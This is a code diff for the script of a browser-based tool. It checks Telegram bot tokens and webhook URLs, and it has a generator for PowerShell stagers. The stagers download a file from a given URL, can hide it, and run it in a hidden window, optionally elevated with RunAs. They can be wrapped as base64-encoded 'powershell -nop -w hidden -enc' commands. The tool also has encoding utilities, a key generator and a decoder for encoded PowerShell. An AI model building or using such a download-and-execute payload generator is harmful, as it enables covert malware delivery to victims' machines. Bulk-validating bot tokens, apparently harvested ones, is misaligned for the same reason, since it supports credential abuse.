+  const tokens=$('chkTokens').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
+  const out=$('chkTokenOut'); out.innerHTML='';
+  for(const t of tokens){
+    try{
+      const j=await (await fetch('https://api.telegram.org/bot'+t+'/getMe')).json();
+      out.innerHTML+=j.ok
+        ?`<div class="msg-item"><div><span class="badge status-ok">OK</span> @${esc(j.result.username||'')}</div></div>`
+        :`<div class="msg-item"><div><span class="badge status-bad">FAIL</span></div></div>`;
+    }catch{ out.innerHTML+=`<div class="msg-item"><span class="badge status-bad">NET</span></div>`; }
+  }
+});
+$('chkHookBtn').addEventListener('click', async ()=>{
+  const urls=$('chkHooks').value.split(/\n+/).map(s=>s.trim()).filter(Boolean);
+  const out=$('chkHookOut'); out.innerHTML='';
+  for(const url of urls){
+    try{
+      const r=await fetch(url); const j=await r.json().catch(()=>({}));
+      out.innerHTML+=`<div class="msg-item"><div><span class="badge ${r.ok?'status-ok':'status-bad'}">${r.status}</span> ${esc(j.name||j.id||'')}</div></div>`;
+    }catch{ out.innerHTML+=`<div class="msg-item"><span class="badge status-bad">NET</span></div>`; }
+  }
+});
+
+/* PS */
+const DIR_MAP={
+  TEMP:{ps:'$env:TEMP',show:'%TEMP%'},
+  LOCALAPPDATA:{ps:'$env:LOCALAPPDATA',show:'%LOCALAPPDATA%'},
+  APPDATA:{ps:'$env:APPDATA',show:'%APPDATA%'},
+  DOWNLOADS:{ps:"[Environment]::GetFolderPath('UserProfile')+'\\\\Downloads'",show:'%USERPROFILE%\\Downloads'},
+  CUSTOM:{ps:null,show:null}
+};
+function filenameFromUrl(u){ try{ const p=new URL(u).pathname.split('/').filter(Boolean).pop()||'payload.bin'; return decodeURIComponent(p.split('?')[0])||'payload.bin'; }catch{ return 'payload.bin'; } }
+function sq(s){ return "'"+String(s).replace(/'/g,"''")+"'"; }
+function buildPs(){
+  const url=$('psUrl').value.trim(); if(!url) return null;
+  let name=$('psName').value.trim()||filenameFromUrl(url);
+  const dirKey=$('psDir').value; let dirPs,dirShow;
+  if(dirKey==='CUSTOM'){ const c=$('psCustom').value.trim()||'C:\\Users\\Public'; dirPs=sq(c); dirShow=c; }
+  else { dirPs=DIR_MAP[dirKey].ps; dirShow=DIR_MAP[dirKey].show; }
+  const lines=[];
+  if($('psMkdir').checked) lines.push(`$d=${dirPs}; if(!(Test-Path $d)){New-Item -ItemType Directory -Path $d -Force|Out-Null}`);
   else lines.push(`$d=${dirPs}`);
   lines.push(`$o=Join-Path $d ${sq(name)}`);
   lines.push(`(New-Object Net.WebClient).DownloadFile(${sq(url)},$o)`);
-  if (hidden) lines.push(`(Get-Item $o).Attributes='Hidden'`);
-  let start = `Start-Process -FilePath $o`;
-  if (silent) start += ` -WindowStyle Hidden`;
-  if (wait) start += ` -Wait`;
-  if (admin) start += ` -Verb RunAs`;
+  if($('psHidden').checked) lines.push(`(Get-Item $o).Attributes='Hidden'`);
+  let start=`Start-Process -FilePath $o`;
+  if($('psSilent').checked) start+=' -WindowStyle Hidden';
+  if($('psWait').checked) start+=' -Wait';
+  if($('psAdmin').checked) start+=' -Verb RunAs';
   lines.push(start);
-  const cmd = lines.join(';');
-  $('psPath').textContent = 'path: ' + dirShow + '\\' + name;
-  if (b64) {
-    const bytes = new TextEncoder().encode(cmd);
-    const utf16 = new Uint8Array(bytes.length * 2);
-    for (let i = 0; i < bytes.length; i++) utf16[i * 2] = bytes[i];
-    let bin = '';
-    utf16.forEach(b => bin += String.fromCharCode(b));
-    return 'powershell -nop -w hidden -enc ' + btoa(bin);
+  const cmd=lines.join(';');
+  $('psPath').textContent='path: '+dirShow+'\\'+name;
+  if($('psB64').checked){
+    const bytes=new TextEncoder().encode(cmd);
+    const utf16=new Uint8Array(bytes.length*2);
+    for(let i=0;i<bytes.length;i++) utf16[i*2]=bytes[i];
+    let bin=''; utf16.forEach(b=>bin+=String.fromCharCode(b));
+    return 'powershell -nop -w hidden -enc '+btoa(bin);
   }
-  return 'powershell -nop -w hidden -c "' + cmd.replace(/"/g, '`"') + '"';
+  return 'powershell -nop -w hidden -c "'+cmd.replace(/"/g,'`"')+'"';
 }
-function renderPs() {
-  const out = buildPs();
-  $('psOut').textContent = out || '—';
-}
-$('psDir').addEventListener('change', () => {
-  $('psCustomWrap').style.display = $('psDir').value === 'CUSTOM' ? 'block' : 'none';
-  renderPs();
+function renderPs(){ $('psOut').textContent=buildPs()||'—'; }
+$('psDir').addEventListener('change',()=>{ $('psCustomWrap').style.display=$('psDir').value==='CUSTOM'?'block':'none'; renderPs(); });
+['psUrl','psName','psCustom','psHidden','psSilent','psWait','psAdmin','psMkdir','psB64'].forEach(id=>{
+  const el=$(id); if(!el) return;
+  el.addEventListener('input',renderPs); el.addEventListener('change',renderPs);
 });
-['psUrl','psName','psCustom','psHidden','psSilent','psWait','psAdmin','psMkdir','psB64'].forEach(id => {
-  const el = $(id);
-  if (el) el.addEventListener('input', renderPs);
-  if (el && el.type === 'checkbox') el.addEventListener('change', renderPs);
-});
-$('psBuild').addEventListener('click', renderPs);
-$('psCopy').addEventListener('click', () => copyText($('psOut').textContent || ''));
+$('psBuild').addEventListener('click',renderPs);
+$('psCopy').addEventListener('click',()=>copyText($('psOut').textContent||''));
 
-/* Codec */
-function runCodec() {
-  const inp = $('codecIn').value;
-  const mode = $('codecMode').value;
-  let out = '';
-  try {
-    if (mode === 'b64e') out = btoa(unescape(encodeURIComponent(inp)));
-    else if (mode === 'b64d') out = decodeURIComponent(escape(atob(inp.replace(/\s+/g,''))));
-    else if (mode === 'urlenc') out = encodeURIComponent(inp);
-    else if (mode === 'urldec') out = decodeURIComponent(inp);
-    else if (mode === 'hexe') out = Array.from(new TextEncoder().encode(inp)).map(b => b.toString(16).padStart(2,'0')).join('');
-    else if (mode === 'hexd') {
-      const bytes = new Uint8Array((inp.replace(/\s/g,'').match(/.{1,2}/g)||[]).map(h => parseInt(h,16)));
-      out = new TextDecoder().decode(bytes);
-    } else if (mode === 'ue') out = Array.from(inp).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join('');
-    else if (mode === 'ud') out = inp.replace(/\\u([0-9a-fA-F]{4})/g, (_,h) => String.fromCharCode(parseInt(h,16)));
-  } catch (e) { out = 'error: ' + e.message; }
-  $('codecOut').value = out;
+/* codec */
+$('codecRun').addEventListener('click',()=>{
+  const inp=$('codecIn').value; const mode=$('codecMode').value; let out='';
+  try{
+    if(mode==='b64e') out=btoa(unescape(encodeURIComponent(inp)));
+    else if(mode==='b64d') out=decodeURIComponent(escape(atob(inp.replace(/\s+/g,''))));
+    else if(mode==='urlenc') out=encodeURIComponent(inp);
+    else if(mode==='urldec') out=decodeURIComponent(inp);
+    else if(mode==='hexe') out=Array.from(new TextEncoder().encode(inp)).map(b=>b.toString(16).padStart(2,'0')).join('');
+    else if(mode==='hexd'){ const bytes=new Uint8Array((inp.replace(/\s/g,'').match(/.{1,2}/g)||[]).map(h=>parseInt(h,16))); out=new TextDecoder().decode(bytes); }
+  }catch(e){ out='err '+e.message; }
+  $('codecOut').value=out;
+});
+$('codecCopy').addEventListener('click',()=>copyText($('codecOut').value));
+
+/* keys */
+function genKey(){
+  const len=parseInt($('keyLen').value,10)||32; const alpha=$('keyAlpha').value;
+  if(alpha==='uuid') return crypto.randomUUID();
+  const chars=alpha==='hex'?'0123456789abcdef':'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789';
+  const arr=new Uint8Array(len); crypto.getRandomValues(arr);
+  return Array.from(arr,b=>chars[b%chars.length]).join('');
 }
-$('codecRun').addEventListener('click', runCodec);
-$('codecCopy').addEventListener('click', () => copyText($('codecOut').value));
-$('codecSwap').addEventListener('click', () => {
-  const a = $('codecIn').value; $('codecIn').value = $('codecOut').value; $('codecOut').value = a;
+$('keyGen').addEventListener('click',()=>{ $('keyOut').value=genKey(); $('keyList').style.display='none'; });
+$('keyCopy').addEventListener('click',()=>copyText($('keyOut').value));
+$('keyGen5').addEventListener('click',()=>{
+  const lines=[]; for(let i=0;i<5;i++) lines.push(genKey());
+  $('keyList').style.display='block'; $('keyList').textContent=lines.join('\n'); $('keyOut').value=lines[0];
 });
 
-/* Keys */
-function genKey() {
-  const len = parseInt($('keyLen').value, 10) || 32;
-  const alpha = $('keyAlpha').value;
-  if (alpha === 'uuid') return crypto.randomUUID();
-  const chars = alpha === 'hex' ? '0123456789abcdef'
-    : alpha === 'base64' ? 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    : 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789';
-  const arr = new Uint8Array(len);
-  crypto.getRandomValues(arr);
-  return Array.from(arr, b => chars[b % chars.length]).join('');
-}
-$('keyGen').addEventListener('click', () => { $('keyOut').value = genKey(); $('keyList').style.display='none'; });
-$('keyCopy').addEventListener('click', () => copyText($('keyOut').value));
-$('keyGen5').addEventListener('click', () => {
-  const lines = [];
-  for (let i = 0; i < 5; i++) lines.push(genKey());
-  $('keyList').style.display = 'block';
-  $('keyList').textContent = lines.join('\n');
-  $('keyOut').value = lines[0];
-});
-
-/* PS Decode */
-$('psDecRun').addEventListener('click', () => {
-  let raw = $('psDecIn').value.trim();
-  const out = $('psDecOut');
-  try {
-    let m = raw.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i);
-    let b64 = m ? m[1] : raw.replace(/\s+/g,'');
-    const bin = atob(b64);
-    let utf16 = '';
-    for (let i = 0; i + 1 < bin.length; i += 2) {
-      utf16 += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i+1) << 8));
-    }
-    let text = utf16;
-    const nested = text.match(/FromBase64String\(['"]([A-Za-z0-9+/=]+)['"]\)/i);
-    if (nested) {
-      try { text += '\n\n--- nested ---\n' + atob(nested[1]); } catch (_) {}
-    }
-    out.textContent = text;
-  } catch (e) {
-    out.textContent = 'fail: ' + e.message;
-  }
+/* psdec */
+$('psDecRun').addEventListener('click',()=>{
+  let raw=$('psDecIn').value.trim(); const out=$('psDecOut');
+  try{
+    let m=raw.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i);
+    let b64=m?m[1]:raw.replace(/\s+/g,'');
+    const bin=atob(b64); let utf16='';
+    for(let i=0;i+1<bin.length;i+=2) utf16+=String.fromCharCode(bin.charCodeAt(i)|(bin.charCodeAt(i+1)<<8));
+    out.textContent=utf16;
+  }catch(e){ out.textContent='fail: '+e.message; }
 });
 </script>
 </body>
